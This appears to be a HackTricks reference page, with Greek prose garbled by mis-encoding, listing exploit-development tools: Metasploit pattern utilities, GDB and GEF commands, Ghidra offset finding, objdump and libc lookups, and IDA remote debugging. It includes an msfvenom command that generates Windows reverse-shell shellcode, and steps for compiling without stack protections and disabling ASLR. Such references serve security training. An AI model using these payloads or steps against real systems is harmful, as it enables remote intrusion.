# Î•ÏÎ³Î±Î»ÎµÎ¯Î± Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Metasploit
```
pattern_create.rb -l 3000   #Length
pattern_offset.rb -l 3000 -q 5f97d534   #Search offset
nasm_shell.rb
nasm> jmp esp   #Get opcodes
msfelfscan -j esi /opt/fusion/bin/level01
```
### Shellcodes
```
msfvenom /p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> [EXITFUNC=thread] [-e x86/shikata_ga_nai] -b "\x00\x0a\x0d" -f c
```
## GDB

### Î•Î³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·
```
apt-get install gdb
```
### Î Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Î¹
```bash
-q #Â No show banner
-x <file> # Auto-execute GDB instructions from here
-p <pid> #Â Attach to process
```
### ÎŸÎ´Î·Î³Î¯ÎµÏ‚
```bash
run # Execute
start # Start and break in main
n/next/ni # Execute next instruction (no inside)
s/step/si # Execute next instruction
c/continue # Continue until next breakpoint
p system # Find the address of the system function
set $eip = 0x12345678 # Change value of $eip
help # Get help
quit # exit

# Disassemble
disassemble main # Disassemble the function called main
disassemble 0x12345678 # Disassemble taht address
set disassembly-flavor intel # Use intel syntax
set follow-fork-mode child/parent # Follow child/parent process

# Breakpoints
br func # Add breakpoint to function
br *func+23
br *0x12345678
del <NUM> # Delete that number of breakpoint
watch EXPRESSION # Break if the value changes

# info
info functions --> Info abount functions
info functions func --> Info of the funtion
info registers --> Value of the registers
bt # Backtrace Stack
bt full # Detailed stack
print variable
print 0x87654321 - 0x12345678 # Caculate

# x/examine
examine/<num><o/x/d/u/t/i/s/c><b/h/w/g> dir_mem/reg/puntero # Shows content of <num> in <octal/hexa/decimal/unsigned/bin/instruction/ascii/char> where each entry is a <Byte/half word (2B)/Word (4B)/Giant word (8B)>
x/o 0xDir_hex
x/2x $eip # 2Words from EIP
x/2x $eip -4 # $eip - 4
x/8xb $eip # 8 bytes (b-> byte, h-> 2bytes, w-> 4bytes, g-> 8bytes)
i r eip # Value of $eip
x/w pointer # Value of the pointer
x/s pointer # String pointed by the pointer
x/xw &pointer # Address where the pointer is located
x/i $eip # Instructions of the EIP
```
### [GEF](https://github.com/hugsy/gef)
```bash
help memory # Get help on memory command
canary # Search for canary value in memory
checksec #Check protections
p system #Find system function address
search-pattern "/bin/sh" #Search in the process memory
vmmap #Get memory mappings
xinfo <addr> # Shows page, size, perms, memory area and offset of the addr in the page
memory watch 0x784000 0x1000 byte #Add a view always showinf this memory
got #Check got table
memory watch $_got()+0x18 5 #Watch a part of the got table

# Vulns detection
format-string-helper #Detect insecure format strings
heap-analysis-helper #Checks allocation and deallocations of memory chunks:NULL free, UAF,double free, heap overlap

#Patterns
pattern create 200 #Generate length 200 pattern
pattern search "avaaawaa" #Search for the offset of that substring
pattern search $rsp #Search the offset given the content of $rsp

#Shellcode
shellcode search x86 #Search shellcodes
shellcode get 61 #Download shellcode number 61

#Another way to get the offset of to the RIP
1- Put a bp after the function that overwrites the RIP and send a ppatern to ovwerwrite it
2- efâ¤  i f
Stack level 0, frame at 0x7fffffffddd0:
rip = 0x400cd3; saved rip = 0x6261617762616176
called by frame at 0x7fffffffddd8
Arglist at 0x7fffffffdcf8, args:
Locals at 0x7fffffffdcf8, Previous frame's sp is 0x7fffffffddd0
Saved registers:
rbp at 0x7fffffffddc0, rip at 0x7fffffffddc8
gefâ¤  pattern search 0x6261617762616176
[+] Searching for '0x6261617762616176'
[+] Found at offset 184 (little-endian search) likely
```
### Tricks

#### GDB Î¯Î´Î¹ÎµÏ‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚

Î•Î½Ï ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰ÏƒÎ·, Ï„Î¿ GDB Î¸Î± Î­Ï‡ÎµÎ¹ **ÎµÎ»Î±Ï†ÏÏÏ‚ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ­Ï‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ ÎºÎ±Ï„Î¬ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ·.** ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Ï„Î¿ GDB Î½Î± Î­Ï‡ÎµÎ¹ Ï„Î¹Ï‚ Î¯Î´Î¹ÎµÏ‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚:

* `unset env LINES`
* `unset env COLUMNS`
* `set env _=<path>` _Î’Î¬Î»Ï„Îµ Ï„Î·Î½ Î±Ï€ÏŒÎ»Ï…Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® ÏƒÏ„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿_
* Î•ÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Î¯Î´Î¹Î± Î±Ï€ÏŒÎ»Ï…Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î®
* `PWD` ÎºÎ±Î¹ `OLDPWD` Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ Î¿Î¹ Î¯Î´Î¹ÎµÏ‚ ÏŒÏ„Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Îµ Ï„Î¿ GDB ÎºÎ±Î¹ ÏŒÏ„Î±Î½ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏƒÏ„Îµ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿

#### Backtrace Î³Î¹Î± Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½

ÎŒÏ„Î±Î½ Î­Ï‡ÎµÏ„Îµ Î­Î½Î± **ÏƒÏ„Î±Ï„Î¹ÎºÎ¬ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿**, ÏŒÎ»ÎµÏ‚ Î¿Î¹ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Î¸Î± Î±Î½Î®ÎºÎ¿Ï…Î½ ÏƒÏ„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ (ÎºÎ±Î¹ ÏŒÏ‡Î¹ ÏƒÎµ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ­Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚). Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Î¸Î± ÎµÎ¯Î½Î±Î¹ Î´ÏÏƒÎºÎ¿Î»Î¿ Î½Î± **ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÏ„Îµ Ï„Î· ÏÎ¿Î® Ï€Î¿Ï… Î±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Î³Î¹Î± Î½Î± Î¶Î·Ï„Î®ÏƒÎµÎ¹, Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, ÎµÎ¯ÏƒÎ¿Î´Î¿ Î±Ï€ÏŒ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î·.**\
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏÎºÎ¿Î»Î± Î½Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÏ„Îµ Î±Ï…Ï„Î® Ï„Î· ÏÎ¿Î® **Ï„ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚** Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Î¼Îµ **gdb** Î¼Î­Ï‡ÏÎ¹ Î½Î± ÏƒÎ±Ï‚ Î¶Î·Ï„Î·Î¸ÎµÎ¯ ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÏƒÏ„Î±Î¼Î±Ï„Î®ÏƒÏ„Îµ Ï„Î¿ Î¼Îµ **CTRL+C** ÎºÎ±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® **`bt`** (**backtrace**) Î³Î¹Î± Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½:
```
gefâ¤  bt
#0  0x00000000004498ae in ?? ()
#1  0x0000000000400b90 in ?? ()
#2  0x0000000000400c1d in ?? ()
#3  0x00000000004011a9 in ?? ()
#4  0x0000000000400a5a in ?? ()
```
### GDB server

`gdbserver --multi 0.0.0.0:23947` (ÏƒÏ„Î·Î½ IDA Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÏƒÏ…Î¼Ï€Î»Î·ÏÏÏƒÎµÏ„Îµ Ï„Î· Î±Ï€ÏŒÎ»Ï…Ï„Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï„Î¿Ï… ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î¿Ï… ÏƒÏ„Î· Linux Î¼Î·Ï‡Î±Î½Î® ÎºÎ±Î¹ ÏƒÏ„Î· Windows Î¼Î·Ï‡Î±Î½Î®)

## Ghidra

### Find stack offset

**Ghidra** ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿ **offset** Î³Î¹Î± Î­Î½Î± **buffer overflow Ï‡Î¬ÏÎ· ÏƒÏ„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î· Î¸Î­ÏƒÎ· Ï„Ï‰Î½ Ï„Î¿Ï€Î¹ÎºÏÎ½ Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½.**\
Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, ÏƒÏ„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î¼Î¹Î± ÏÎ¿Î® buffer ÏƒÏ„Î¿ `local_bc` Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ ÏŒÏ„Î¹ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ Î­Î½Î± offset `0xbc`. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î±Î½ Ï„Î¿ `local_10` ÎµÎ¯Î½Î±Î¹ Î­Î½Î± canary cookie, Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÎ¹ ÏŒÏ„Î¹ Î³Î¹Î± Î½Î± Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿ `local_bc` Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î± offset `0xac`.\
_Î˜Ï…Î¼Î·Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Ï„Î± Ï€ÏÏÏ„Î± 0x08 Î±Ï€ÏŒ ÏŒÏ€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ Ï„Î¿ RIP Î±Î½Î®ÎºÎ¿Ï…Î½ ÏƒÏ„Î¿ RBP._

![](<../../.gitbook/assets/image (616).png>)

## GCC

**gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack 1.2.c -o 1.2** --> Î£Ï…Î¼Ï€Î¯ÎµÏƒÎ· Ï‡Ï‰ÏÎ¯Ï‚ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯ÎµÏ‚\
**-o** --> ÎˆÎ¾Î¿Î´Î¿Ï‚\
**-g** --> Î‘Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· ÎºÏÎ´Î¹ÎºÎ± (Ï„Î¿ GDB Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï„Î¿ Î´ÎµÎ¹)\
**echo 0 > /proc/sys/kernel/randomize\_va\_space** --> Î“Î¹Î± Î½Î± Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ ASLR ÏƒÏ„Î¿ linux

**Î“Î¹Î± Î½Î± ÏƒÏ…Î¼Ï€Î¹Î­ÏƒÎµÏ„Îµ Î­Î½Î± shellcode:**\
**nasm -f elf assembly.asm** --> ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†ÎµÎ¹ Î­Î½Î± ".o"\
**ld assembly.o -o shellcodeout** --> Î•ÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î¿

## Objdump

**-d** --> **Î‘Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Ï‰Î½** Ï„Î¼Î·Î¼Î¬Ï„Ï‰Î½ (Î´ÎµÎ¯Ï„Îµ Ï„Î± opcodes ÎµÎ½ÏŒÏ‚ ÏƒÏ…Î¼Ï€Î¹ÎµÏƒÎ¼Î­Î½Î¿Ï… shellcode, Î²ÏÎµÎ¯Ï„Îµ ROP Gadgets, Î²ÏÎµÎ¯Ï„Îµ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚...)\
**-Mintel** --> **Î£ÏÎ½Ï„Î±Î¾Î· Intel**\
**-t** --> **Î Î¯Î½Î±ÎºÎ±Ï‚ ÏƒÏ…Î¼Î²ÏŒÎ»Ï‰Î½**\
**-D** --> **Î‘Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»ÏŒÎ³Î·ÏƒÎ· ÏŒÎ»Ï‰Î½** (Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏƒÏ„Î±Ï„Î¹ÎºÎ®Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î®Ï‚)\
**-s -j .dtors** --> Ï„Î¼Î®Î¼Î± dtors\
**-s -j .got** --> Ï„Î¼Î®Î¼Î± got\
\-D -s -j .plt --> **plt** Ï„Î¼Î®Î¼Î± **Î±Ï€Î¿ÏƒÏ…Î½Î±ÏÎ¼Î¿Î»Î¿Î³Î·Î¼Î­Î½Î¿**\
**-TR** --> **ÎœÎµÏ„Î±Ï„Î¿Ï€Î¯ÏƒÎµÎ¹Ï‚**\
**ojdump -t --dynamic-relo ./exec | grep puts** --> Î”Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î¿Ï… "puts" Î³Î¹Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· ÏƒÏ„Î¿ GOT\
**objdump -D ./exec | grep "VAR\_NAME"** --> Î”Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Î® ÏƒÏ„Î±Ï„Î¹ÎºÎ® Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® (Î±Ï…Ï„Î­Ï‚ Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ ÏƒÏ„Î·Î½ Ï„Î¼Î®Î¼Î± DATA).

## Core dumps

1. Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ `ulimit -c unlimited` Ï€ÏÎ¹Î½ Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÏ„Îµ Ï„Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Î¼Î¿Ï…
2. Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ `sudo sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t`
3. sudo gdb --core=\<path/core> --quiet

## More

**ldd executable | grep libc.so.6** --> Î”Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· (Î±Î½ ASLR, Ï„ÏŒÏ„Îµ Î±Ï…Ï„ÏŒ Î±Î»Î»Î¬Î¶ÎµÎ¹ ÎºÎ¬Î¸Îµ Ï†Î¿ÏÎ¬)\
**for i in \`seq 0 20\`; do ldd \<Ejecutable> | grep libc; done** --> Î’ÏÏŒÏ‡Î¿Ï‚ Î³Î¹Î± Î½Î± Î´ÎµÎ¯Ï„Îµ Î±Î½ Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Î±Î»Î»Î¬Î¶ÎµÎ¹ Ï€Î¿Î»Ï\
**readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system** --> Offset Ï„Î¿Ï… "system"\
**strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh** --> Offset Ï„Î¿Ï… "/bin/sh"

**strace executable** --> Î›ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ Ï€Î¿Ï… ÎºÎ±Î»Î¿ÏÎ½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î¿\
**rabin2 -i ejecutable -->** Î”Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÏÎ½

## **Inmunity debugger**
```bash
!mona modules    #Get protections, look for all false except last one (Dll of SO)
!mona find -s "\xff\xe4" -m name_unsecure.dll   #Search for opcodes insie dll space (JMP ESP)
```
## IDA

### Î‘Ï€Î¿ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰ÏƒÎ· ÏƒÎµ Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿ linux

ÎœÎ­ÏƒÎ± ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ IDA Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î´Ï…Î±Î´Î¹ÎºÎ¬ Î±ÏÏ‡ÎµÎ¯Î± Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± Î½Î± Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î±Ï„ÏÏƒÎ¿Ï…Î½ Î­Î½Î± Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± linux. Î“Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ, Î¼ÎµÏ„Î±Ï†Î­ÏÎµÏ„Îµ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ _linux\_server_ Î® _linux\_server64_ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® linux ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Ï„Î¿ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ Ï†Î¬ÎºÎµÎ»Î¿ Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ:
```
./linux_server64 -Ppass
```
Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÏÏ…Î¸Î¼Î¯ÏƒÏ„Îµ Ï„Î¿Î½ Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î±Ï„Ï‰Ï„Î®: Debugger (linux remote) --> Î•Ï€Î¹Î»Î¿Î³Î­Ï‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î±Ï‚...:

![](<../../.gitbook/assets/image (101).png>)

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
